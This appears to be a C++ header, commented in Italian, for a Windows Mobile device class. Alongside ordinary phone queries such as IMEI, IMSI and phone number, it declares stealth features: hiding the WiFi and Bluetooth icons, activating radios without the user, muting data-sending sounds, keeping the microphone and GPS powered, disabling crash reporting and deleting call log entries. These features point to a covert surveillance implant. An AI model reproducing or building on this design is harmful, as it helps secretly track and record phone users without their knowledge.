#include "Common.h"
#include <string>
#include <exception>
#include <common_new\Pm.h>
///#include <winioctl.h>
#include <vector>

using namespace std;

#ifndef __Device_h__
#define __Device_h__

#include "Encryption.h"

#include "common_new.h"

#define UFN_CLIENT_NAME_MAX_CHARS 128
#define UFN_CLIENT_DESCRIPTION_MAX_CHARS 250
#define USB_FUN_DEV L"UFN1:"
#define IOCTL_UFN_CHANGE_CURRENT_CLIENT CTL_CODE(FILE_DEVICE_UNKNOWN, 4, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef void (*POWERNOTIFYCALLBACK)(POWER_BROADCAST *powerBcast, DWORD dwUserData);

typedef struct _UFN_CLIENT_INFO {
	TCHAR szName[UFN_CLIENT_NAME_MAX_CHARS];
	TCHAR szDescription[UFN_CLIENT_DESCRIPTION_MAX_CHARS];
} UFN_CLIENT_INFO, *PUFN_CLIENT_INFO;

typedef struct _DiskStruct {
	wstring strDiskName;
	UINT uDiskIndex;
	ULARGE_INTEGER lFreeToCaller;
	ULARGE_INTEGER lDiskSpace;
	ULARGE_INTEGER lDiskFree;
} DiskStruct, *pDiskStruct;

typedef struct _CallBackStruct {
	POWERNOTIFYCALLBACK pfnPowerNotify;
	DWORD dwUserData;
} CallBackStruct, *pCallBackStruct;

class Status;
class Device;

// Tutti i puntatori tornati da questa classe vengono liberati dal distruttore.
class Device
{
	private:
	/**
	 * Definizioni per la classe singleton
	 */
	static Device *Instance;
	static volatile LONG lLock;

	HANDLE hDeviceMutex, hDeviceQueue, hPowerNotification, hNotifyThread, hResetIdleThread, hIdleEvent;

	/**
	 * Database statico dei modelli e funzionalita' supportati.
	 */
	private: wstring strImei, strImsi, strSimId, strInstanceId, strPhoneNumber, strManufacturer, strModel;
	private: map<UINT, DiskStruct> mDiskInfo; // Indice, DiskStruct

	/**
	 * Variabili che contengono lo stato del telefono.
	 */
	private: DWORD dwPhoneState, dwRadioState;
	private: SYSTEM_POWER_STATUS_EX2 *systemPowerStatus;
	private: HANDLE hGpsPower, hMicPower;
	private: INT iWaveDevRef;
	private: UINT uMmcNumber;
	private: DWORD m_WiFiSoundValue, m_DataSendSoundValue;
	private: vector<CallBackStruct> vecCallbacks;

	/**
	 * Variabile utilizzata per il calcolo del time-delta
	 */
	private: ULARGE_INTEGER ulTimeDiff;

	/**
	* Device e' una classe singleton
	*/
	public: static Device* self();

	/**
	 * Imposta il device del GPS in modo da non spegnerlo mai, torna TRUE se la chiamata
	 * va a buon fine, FALSE altrimenti.
	 */
	public: BOOL SetGpsPowerState();

	/**
	 * Reimposta il powerstate del device GPS a quello che c'era prima della chiamata a
	 * SetGpsPowerState(). Torna TRUE se la chiamata va a buon fine, FALSE altrimenti.
	 */
	public: BOOL ReleaseGpsPowerState();

	/**
	* Imposta il device del Microfono in modo da non spegnerlo mai, torna TRUE se la chiamata
	* va a buon fine, FALSE altrimenti.
	*/
	public: BOOL SetMicPowerState();

	/**
	* Reimposta il powerstate del device Microfono a quello che c'era prima della chiamata a
	* SetMicPowerState(). Torna TRUE se la chiamata va a buon fine, FALSE altrimenti.
	*/
	public: BOOL ReleaseMicPowerState();

	/**
	 * Torna lo stato del display, se non riesce a leggerlo torna sempre D0, ovvero attivo.
	 */
	public: CEDEVICE_POWER_STATE GetFrontLightPowerState();

	/**
	 * Ottiene informazioni sul sistema operativo e riempie la struttura passata per riferimento, torna TRUE se la
	 * chiamata e' andata a buon fine, FALSE altrimenti.
	 */
	public: BOOL GetOsVersion(OSVERSIONINFO* pVersionInfo);

	/**
	* Ottiene informazioni sull'architetturae riempie la struttura passata per riferimento.
	*/
	public: void GetSystemInfo(SYSTEM_INFO* pSystemInfo);

	/**
	* Ottiene informazioni sulla memoria installata nel device.
	*/
	public: void GetMemoryInfo(MEMORYSTATUS* pMemoryInfo);

	/**
	* Prende il Mobile Country Code dall'IMSI, torna 0 se non ci riesce.
	*/
	public: DWORD GetMobileCountryCode();

	/**
	* Prende il Mobile Network Code dall'IMSI, torna 0 se non ci riesce.
	*/
	public: DWORD GetMobileNetworkCode();

	/**
	 * Torna TRUE se supportiamo l'hiding dell'icona del WiFi, FALSE altrimenti. Internamente questa funzione
	 * chiama GetOsVersion() e GetDeviceType() per effettuare il browsing del Db e vedere le funzionalita'
	 * supportate.
	 */
	public: BOOL IsWiFiHidingSupported();

	/**
	 * Torna TRUE se supportiamo l'hiding dell'icona del BlueTooth, FALSE altrimenti. Internamente questa funzione
	 * chiama GetOsVersion() e GetDeviceType() per effettuare il browsing del Db e vedere le funzionalita'
	 * supportate.
	 */
	public: void IsBTHidingSupported();

	/**
	 * Torna TRUE se il dispositivo e' dotato di un modulo per l'utilizzo del WiFi, FALSE altrimenti. Internamente 
	 * questa funzione chiama GetOsVersion() e GetDeviceType() per effettuare il browsing del Db e vedere le 
	 * funzionalita' supportate.
	 */
	public: BOOL IsWifi();

	/**
	 * Torna TRUE se il dispositivo e' dotato di un modulo per l'utilizzo del BT, FALSE altrimenti. Internamente 
	 * questa funzione chiama GetOsVersion() e GetDeviceType() per effettuare il browsing del Db e vedere le 
	 * funzionalita' supportate.
	 */
	public: BOOL IsBT();

	/**
	 * Torna TRUE se siamo in grado di attivare il WiFi senza intervento dell'utente, FALSE altrimenti. Internamente 
	 * questa funzione chiama GetOsVersion() e GetDeviceType() per effettuare il browsing del Db e vedere le 
	 * funzionalita' supportate.
	 */
	public: BOOL IsWiFiActivable();

	/**
	 * Torna TRUE se siamo in grado di attivare il BT senza intervento dell'utente, FALSE altrimenti. Internamente 
	 * questa funzione chiama GetOsVersion() e GetDeviceType() per effettuare il browsing del Db e vedere le 
	 * funzionalita' supportate.
	 */
	public: BOOL IsBTActivable();
	
	/**
	 * Torna TRUE se la radio GSM e' attiva ed in uno stato conosciuto, FALSE altrimenti.
	 */
	public: BOOL IsGsmEnabled();

	/**
	* Torna TRUE se scheda SIM e' inserita, FALSE altrimenti.
	*/
	public: BOOL IsSimEnabled();

	/**
	* Questa funzione legge il codice IMSI dal telefono e torna una stringa che lo contiene. 
	* Torna una stringa vuota in caso di errore.
	*/
	public: const wstring GetImsi();

	/**
	 * Questa funzione legge il codice IMEI dal telefono e torna una stringa che lo contiene. 
	 * Torna una stringa vuota in caso di errore.
	 */
	public: const wstring GetImei();

	/**
	 * Questa funzione ottiene un ID univoco per ogni telefono
	 */
	public: const BYTE* GetInstanceId();

	/**
	 * Ottiene il numero di telefono associato alla SIM correntemente inserita, il numero viene tornato come _stringa_.
	 * Se non e' possibile leggere il numero di telefono, la stringa e' vuota.
	 */
	public: const wstring GetPhoneNumber();

	/**
	* Questa funzione ritorna il produttore del cellulare. Torna una stringa vuota in caso di errore.
	*/
	public: const wstring GetManufacturer();

	/**
	* Questa funzione ritorna il modello del cellulare. Torna una stringa vuota in caso di errore.
	*/
	public: const wstring GetModel();

	/**
	* Torna il numero di schede di memoria attualmente presenti sulla macchina
	*/
	public: UINT GetDiskNumber();

	/**
	* Torna le info su un disco a partire dal relativo indice, strName e' una stringa
	* che conterra' il nome del disco. 
	* plFtc e' un puntatore ad un intero a 64 bit che rappresenta il numero di byte
	* liberi per l'utente. plDsk indica il numero di byte totali sul disco. plDf il
	* numero di byte liberi sul disco.
	* Torna TRUE se la funzione e' andata a buon fine, FALSE altrimenti.
	*/
	public: BOOL GetDiskInfo(UINT uIndex, wstring &strName, 
				PULARGE_INTEGER plFtc, PULARGE_INTEGER plDsk, PULARGE_INTEGER plDf);

	/**
	 * Ritorna le informazioni sullo stato della batteria, torna NULL in caso di errore.
	 */
	public: const SYSTEM_POWER_STATUS_EX2* GetBatteryStatus();

	/**
	 * Questo metodo serve a refreshare esplicitamente tutte le informazioni contenute nella classe,
	 * va usato soltanto quando si e' certi che i dati sono cambiati (ad esempio la SIM e' stata modificata
	 * senza che il cellulare sia stato riavviato etc...). Torna TRUE se tutto e' andato a buon fine
	 * FALSE altrimenti.
	 */
	public: BOOL RefreshData();
	
	/**
	 * Refresha unicamente le info sulla batteria, torna TRUE in caso di successo, FALSE altrimenti.
	 */
	public: BOOL RefreshBatteryStatus();

	/**
	* Torna lo stato di potenza di un qualunque device richiedendolo direttamente al driver.
	* Il nome del device puo' essere sia nel formato {GUID}\DeviceX: che nel formato DeviceX:
	* La funzione torna PwrDeviceUnspecified in caso di errore. NON E' CONCORRENTE!
	*/
	private: CEDEVICE_POWER_STATE NCGetDevicePowerState(const wstring &strDevice);

	/**
	* Imposta lo stato di potenza di un qualunque device comunicandolo direttamente al driver.
	* Il nome del device puo' essere sia nel formato {GUID}\DeviceX: che nel formato DeviceX:
	* La funzione torna TRUE se va a buon fine, FALSE altrimenti. NON E' CONCORRENTE!
	*/
	private: BOOL NCSetDevicePowerState(const wstring &strDevice, CEDEVICE_POWER_STATE cePowerState);

	/**
	* Versione pubblica e concorrente della NCGetDevicePowerState().
	* La funzione torna PwrDeviceUnspecified in caso di errore.
	*/
	public: CEDEVICE_POWER_STATE GetDevicePowerState(const wstring &strDevice);

	/**
	* Versione pubblica e concorrente della NCSetDevicePowerState().
	* La funzione torna TRUE se va a buon fine, FALSE altrimenti.
	*/
	public: BOOL SetDevicePowerState(const wstring &strDevice, CEDEVICE_POWER_STATE cePowerState);

	/**
	 * Disabilita il suono riprodotto quando viene rilevata una rete wireless e quando vengono
	 * inviati dei dati.
	 */
	public: void DisableWiFiNotification();

	/**
	* Ripristina il valore relativo al suono riprodotto quando viene rilevata una rete wireless e
	* quando vengono inviati dei dati. 
	*/
	public: void RestoreWiFiNotification();

	/**
	 * Registra una callback che ricevera' le info sul cambio di power state. Torna TRUE se va
	 * a buon fine, FALSE altrimenti.
	 */
	public: BOOL RegisterPowerNotification(POWERNOTIFYCALLBACK pfnPowerNotify, DWORD dwUserData);

	/**
	 * Unregistra una callback precedentemente registrata. Torna TRUE se va a buon fine, FALSE altrimenti.
	 */
	public: BOOL UnRegisterPowerNotification(POWERNOTIFYCALLBACK pfnPowerNotify);
			
	/**
	 * Invoca le callback registrate, e' pubblica SOLO perche' va chiamata da un thread esterno alla
	 * classe e non si puo' fare altrimenti, quindi non va MAI invocato!
	 */
	public: void CallRegisteredCallbacks(POWER_BROADCAST *powerBroad);

	/**
	 * Questa funzione abilita l'error reporting di DrWatson, torna TRUE se e' andata a buon fine
	 * FALSE altrimenti.
	 */
	public: BOOL EnableDrWatson();

	/**
	 * Questa funzione disabilita l'error reporting di DrWatson, torna TRUE se e' andata a buon fine
	 * FALSE altrimenti. ATTENZIONE: per evitare problemi questa funzione in DEBUG mode torna sempre TRUE.
	 */
	public: BOOL DisableDrWatson();

	/**
	 * Sui telefoni HTC fa in modo che la WiFi resti accesa anche in modalita' unattended. Torna TRUE
	 * se va a buon fine, FALSE altrimenti.
	 */
	public: BOOL HTCEnableKeepWiFiOn();

	//NB: da commentare
	public: void RemoveNotification(const GUID* pClsid);
	public: UINT RemoveCallEntry(wstring lpszNumber);
	public:	BOOL SetPwrRequirement(DWORD dwPwd);
	public:	BOOL VideoPowerSwitch(ULONG VideoPower);

	/**
	 * Torna TRUE se il telefono e' in modalita' _unattended_, FALSE altrimenti.
	 */
	public: BOOL IsDeviceUnattended();

	/**
	 * Torna TRUE se il telefono e' in modalita' POWER_STATE_ON, FALSE altrimenti.
	 */
	public: BOOL IsDeviceOn();

	/**
	 * Abilita o disabilita l'ActiveSync (o il mass-storage), torna TRUE se va a buon fine, FALSE altrimenti.
	 */
	public: BOOL SwitchUSBFunctionProfile(BOOL bEnableActiveSync);

	/**
	* Imposta il time diff
	*/
	public: void SetTimeDiff(ULARGE_INTEGER uTime);

	/**
	* Torna il time diff
	*/
	public: ULARGE_INTEGER GetTimeDiff();

	/**
	* Torna l'handle dell'evento monitorato dall'idle thread
	*/
	HANDLE getIdleEvent();

	/**
	 * Costruttore di default, inizializza il database dei modelli e delle funzioni supportate.
	 */
	private: Device();
	public: ~Device();
};

#endif
